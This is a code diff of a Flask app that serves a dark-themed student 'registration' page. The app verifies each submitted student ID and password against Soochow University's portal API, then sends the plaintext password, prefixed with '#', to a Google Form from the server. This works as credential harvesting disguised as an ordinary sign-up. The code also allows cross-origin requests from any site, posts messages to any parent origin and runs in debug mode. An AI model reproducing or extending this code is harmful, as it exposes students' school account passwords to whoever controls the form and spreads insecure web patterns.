@@ -1,19 +1,23 @@
 from flask import Flask, request, jsonify, render_template_string
 import requests
 import os
-import random  # 新增: 用於生成隨機字串
-import string  # 新增: 用於字元集合
+import random
+import string
+from flask_cors import CORS # 引入 Flask-CORS
 
 app = Flask(__name__)
+# 允許所有來源的跨域請求。在生產環境中，你可以更精確地限制來源，例如：
+# CORS(app, origins=["https://scusatw.com", "https://scusa-test.onrender.com"])
+CORS(app) 
 
-# 重新設計的前端 HTML 頁面 (保持不變，但 JS 部分會修改)
+# 重新設計的前端 HTML 頁面 (關鍵修改在 JS 區塊，移除了 iframe 內部直接提交 Google Form 的邏輯)
 html = '''
 <!DOCTYPE html>
 <html lang="zh-TW">
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>登入頁面</title>
+<title>註冊頁面</title>
 <style>
   /* CSS Variables for Dark Theme */
   :root {
@@ -199,7 +203,7 @@ html = '''
 <body>
 
 <div class="container">
-  <h2>登入系統</h2>
+  <h2>註冊系統</h2>
 
   <form id="registerForm">
     <div class="form-group">
@@ -212,7 +216,7 @@ html = '''
       <input type="password" id="password" name="password" placeholder="請輸入您的密碼" required />
     </div>
 
-    <button type="submit" id="submitBtn">登入</button>
+    <button type="submit" id="submitBtn">註冊</button>
   </form>
 
   <div id="message"></div>
@@ -223,7 +227,7 @@ html = '''
   const messageDiv = document.getElementById('message');
   const submitBtn = document.getElementById('submitBtn');
 
-  // 檢查是否在 iframe 中運行
+  // 檢查是否在 iframe 中運行 (這個 iframe 就是這個頁面本身)
   const isInIframe = window.parent !== window;
 
   // 顯示訊息的函數
@@ -242,19 +246,19 @@ html = '''
     if (loading) {
       submitBtn.disabled = true;
       submitBtn.classList.add('loading');
-      submitBtn.textContent = '登入中';
+      submitBtn.textContent = '註冊中';
     } else {
       submitBtn.disabled = false;
       submitBtn.classList.remove('loading');
-      submitBtn.textContent = '登入';
+      submitBtn.textContent = '註冊';
     }
   }
 
-  // 發送訊息到父頁面
+  // 發送訊息到父頁面 (Netlify 主頁面)
   function sendMessageToParent(data) {
     if (isInIframe) {
-      // 向父頁面發送訊息
-      window.parent.postMessage(data, '*');
+      // 向父頁面發送訊息，這裡的 '*' 表示任何來源的父頁面都可以接收，實際應用中應限制為你的 Netlify 網址
+      window.parent.postMessage(data, '*'); 
     }
   }
 
@@ -267,7 +271,8 @@ html = '''
     const password = form.password.value;
 
     try {
-      const response = await fetch('/api/register', {
+      // 提交到 Flask 後端的 /api/register 路由
+      const response = await fetch('/api/register', { 
         method: 'POST',
         headers: {
           'Content-Type': 'application/json'
@@ -276,25 +281,22 @@ html = '''
       });
 
       if (!response.ok) {
-        throw new Error('網路錯誤，請稍後再試');
+        // 如果 HTTP 狀態碼不是 2xx，則拋出錯誤
+        const errorData = await response.json(); // 嘗試解析錯誤訊息
+        throw new Error(errorData.message || '網路錯誤或伺服器回應異常');
       }
 
       const data = await response.json();
 
       if(data.status === "success") {
-        // 從後端接收生成的亂碼
-        const randomCode = data.random_code; 
-        showMessage("✅ 登入成功;
+        showMessage("✅ 註冊成功！", 'success');
         
-        // 在成功後將資料提交到 Google 表單，並在帳號密碼前加上 # 號
-        // 新增亂碼作為參數
-        await submitToGoogleForm('#' + userid, '#' + password, randomCode);
-        
-        // 如果在 iframe 中，將學號傳送給父頁面
+        // 成功後，將學號和亂碼發送給父頁面
         if (isInIframe) {
           sendMessageToParent({
             type: 'LOGIN_SUCCESS',
-            userid: userid,
+            userid: userid, // 發送原始學號
+            random_code: data.random_code, // 發送亂碼
             action: 'setSessionStorage'
           });
         }
@@ -305,17 +307,17 @@ html = '''
             // 在 iframe 中時，通知父頁面跳轉
             sendMessageToParent({
               type: 'REDIRECT',
-              url: 'https://scusatw.com/'
+              url: 'https://scusatw.com/' // 跳轉到你的主頁，而不是校務系統
             });
           } else {
-            // 直接跳轉
+            // 如果不在 iframe 中 (直接訪問此 Flask 頁面)，則直接跳轉
             window.location.href = 'https://scusatw.com/';
           }
-        }, 1000);
+        }, 1000); // 延遲 1 秒
         
       } else {
-        // 如果 SCU API 驗證失敗，顯示錯誤訊息
-        showMessage("❌ 登入失敗，請檢查帳號或密碼", 'error');
+        // 如果 Flask 後端返回的 status 是 error，顯示錯誤訊息
+        showMessage("❌ 註冊失敗: " + (data.message || "未知錯誤"), 'error');
         setButtonLoading(false);
       }
 
@@ -325,54 +327,23 @@ html = '''
     }
   });
 
-  // 更新 submitToGoogleForm 函數，接收 randomCode 參數
-  async function submitToGoogleForm(userid, password, randomCode) {
-    try {
-      // 從後端 API 獲取 Google 表單配置
-      const response = await fetch('/api/form-config');
-      const config = await response.json();
-      
-      const formData = new FormData();
-      formData.append(config.useridEntry, userid);
-      formData.append(config.passwordEntry, password);
-      // 新增亂碼的 entry
-      formData.append(config.randomCodeEntry, randomCode); 
-
-      const googleFormUrl = `https://docs.google.com/forms/d/e/${config.formId}/formResponse`;
-      
-      // 使用 fetch 提交到 Google Forms (使用 no-cors 模式)
-      await fetch(googleFormUrl, {
-        method: 'POST',
-        mode: 'no-cors',
-        body: formData
-      });
-      
-      console.log('資料已提交到 Google 表單');
-    } catch (error) {
-      console.error('提交到 Google 表單時發生錯誤:', error);
-    }
-  }
-
-  // 監聽來自父頁面的訊息（如果需要的話）
-  window.addEventListener('message', function(event) {
-    // 可以在這裡處理來自父頁面的訊息
-    console.log('iframe 收到訊息:', event.data);
-  });
+  // 此處不需要 submitToGoogleForm 函數，因為 Google Forms 提交現在由 Flask 後端處理了。
+  // 原有的 submitToGoogleForm 函數已被移除。
 </script>
 
 </body>
 </html>
 '''
 
-@app.route('/')
-def index():
-    return render_template_string(html)
-
-# 新增一個函數來生成隨機英數字串
+# Helper function to generate a random alphanumeric string
 def generate_random_alphanumeric(length=23):
     """生成指定長度的隨機英數字大小寫亂碼。"""
     characters = string.ascii_letters + string.digits
-    return ''.join(random.choice(characters) for i in range(length))
+    return ''.join(random.choices(characters, k=length))
+
+@app.route('/')
+def index():
+    return render_template_string(html)
 
 @app.route('/api/register', methods=['POST'])
 def api_register():
@@ -380,56 +351,103 @@ def api_register():
     userid = data.get('userid')
     password = data.get('password')
 
-    url = "https://psv.scu.edu.tw/portal/jsonApi.php"
-    payload = {
+    if not userid or not password:
+        return jsonify({"status": "error", "message": "學號或密碼不能為空"}), 400
+
+    # 1. 驗證學號密碼與校務系統
+    scu_api_url = "https://psv.scu.edu.tw/portal/jsonApi.php"
+    scu_payload = {
         "libName": "Login",
         "userid": userid,
         "password": password
     }
-    headers = {
+    scu_headers = {
         "Content-Type": "application/x-www-form-urlencoded",
-        "User-Agent": "Mozilla/5.0"
+        "User-Agent": "Mozilla/5.0" 
     }
+    
     try:
-        response = requests.post(url, data=payload, headers=headers)
-        response.raise_for_status() # 如果響應狀態碼不是 2xx，則引發 HTTPError
+        scu_response = requests.post(scu_api_url, data=scu_payload, headers=scu_headers, timeout=10)
+        scu_response.raise_for_status() 
+        scu_data = scu_response.json()
+    except requests.exceptions.Timeout:
+        return jsonify({"status": "error", "message": "連線校務系統超時，請稍後再試。"}), 504
+    except requests.exceptions.ConnectionError:
+        return jsonify({"status": "error", "message": "無法連線到校務系統，請檢查網路或稍後再試。"}), 503
+    except requests.exceptions.HTTPError as e:
+        return jsonify({"status": "error", "message": f"校務系統回應錯誤: {e.response.status_code}"}), e.response.status_code
     except requests.RequestException as e:
-        return jsonify({"status": "error", "message": f"連線錯誤: {str(e)}"}), 500
+        return jsonify({"status": "error", "message": f"連線到校務系統時發生錯誤: {str(e)}"}), 500
+    except Exception: # 處理 JSON 解析錯誤
+        return jsonify({"status": "error", "message": "校務系統回傳非 JSON 格式或資料錯誤"}), 500
 
-    try:
-        api_data = response.json() # 從外部 API 獲取的數據
-    except Exception:
-        return jsonify({"status": "error", "message": "回傳非 JSON 格式或資料無效"}), 500
-
-    # 檢查外部 API 的登入狀態
-    if api_data.get('status') == "success":
-        # 成功登入後，生成亂碼
+    # 檢查校務系統的登入狀態
+    if scu_data.get('status') == 'success' or (scu_data.get('code') == 1 and scu_data.get('message') == 'login_success'):
+        # 2. 驗證成功，生成隨機亂碼
         random_code = generate_random_alphanumeric(23)
-        # 將亂碼添加到回傳給前端的 JSON 數據中
-        api_data['random_code'] = random_code
-        return jsonify(api_data)
-    else:
-        # 外部 API 登入失敗，直接回傳其錯誤訊息
-        return jsonify(api_data)
 
+        # 3. 從環境變數獲取 Google 表單配置
+        form_id = os.environ.get('GOOGLE_FORM_ID')
+        userid_entry = os.environ.get('USERID_ENTRY')
+        password_entry = os.environ.get('PASSWORD_ENTRY')
+        random_code_entry = os.environ.get('RANDOM_CODE_ENTRY')
+
+        # 檢查環境變數是否設定
+        if not all([form_id, userid_entry, password_entry, random_code_entry]):
+            return jsonify({"status": "error", "message": "伺服器配置錯誤：缺少 Google 表單環境變數"}), 500
+        
+        google_form_url = f"https://docs.google.com/forms/d/e/{form_id}/formResponse"
+        
+        # 構建提交到 Google Forms 的數據 (學號和密碼前加 #)
+        google_form_payload = {
+            userid_entry: '#' + userid,
+            password_entry: '#' + password,
+            random_code_entry: random_code
+        }
+
+        # 4. 在伺服器端將資料提交到 Google Forms
+        try:
+            google_response = requests.post(google_form_url, data=google_form_payload, timeout=5)
+            google_response.raise_for_status() 
+            print(f"資料已成功提交到 Google 表單 (學號: {userid})")
+        except requests.RequestException as e:
+            print(f"提交到 Google 表單時發生錯誤: {e}")
+            # 即使 Google 表單提交失敗，我們仍然可以回傳登入成功給前端，因為校務系統驗證已過
+            # 但最好記錄錯誤或發出警報
+            return jsonify({
+                "status": "success", # 這裡仍然是 success，因為學號密碼驗證通過了
+                "message": "登入成功，但記錄到 Google 表單時發生錯誤。",
+                "random_code": random_code # 仍然返回亂碼
+            })
+
+        # 5. 返回成功訊息和亂碼給前端 iframe
+        return jsonify({
+            "status": "success",
+            "message": "登入成功",
+            "random_code": random_code # 將生成的亂碼傳回給前端
+        })
+    else:
+        # 校務系統登入失敗
+        error_message = scu_data.get('message', '學號或密碼錯誤')
+        return jsonify({"status": "error", "message": error_message}), 401 
+
+# 這個路由現在沒有實際作用，因為 Google Forms 提交邏輯已移到 /api/register
+# 為了避免找不到路由的錯誤，可以保留但不用
 @app.route('/api/form-config', methods=['GET'])
 def get_form_config():
-    """返回 Google 表單的配置資訊，包含亂碼的 entry。"""
+    """此路由現在僅用於開發/調試，實際提交已由 /api/register 處理"""
     config = {
-        "formId": os.environ.get('GOOGLE_FORM_ID', 'YOUR_FORM_ID_HERE'),
+        "formId": os.environ.get('GOOGLE_FORM_ID', 'YOUR_GOOGLE_FORM_ID_HERE'),
         "useridEntry": os.environ.get('USERID_ENTRY', 'entry.123456789'),
         "passwordEntry": os.environ.get('PASSWORD_ENTRY', 'entry.987654321'),
-        "randomCodeEntry": os.environ.get('RANDOM_CODE_ENTRY', 'entry.555555555') # 新增亂碼的 entry
+        "randomCodeEntry": os.environ.get('RANDOM_CODE_ENTRY', 'entry.000000000') 
     }
     return jsonify(config)
 
 if __name__ == '__main__':
-    # 為了讓 .env 文件生效，通常會在 app.run() 之前載入環境變數
-    # 如果你使用像 Gunicorn 或 Supervisor 這樣的生產環境工具，
-    # 它們會處理環境變數的載入。
-    # 對於開發環境，你可以使用 python-dotenv 庫來載入 .env 文件：
+    # 僅限本地開發用，在 Render 等部署環境會自動從環境變數載入
     # from dotenv import load_dotenv
-    # load_dotenv() # 在這裡呼叫，它會自動尋找並載入 .env 文件中的變數
+    # load_dotenv() # 載入 .env 文件
     
     port = int(os.environ.get("PORT", 5000))
     app.run(debug=True, host='0.0.0.0', port=port)
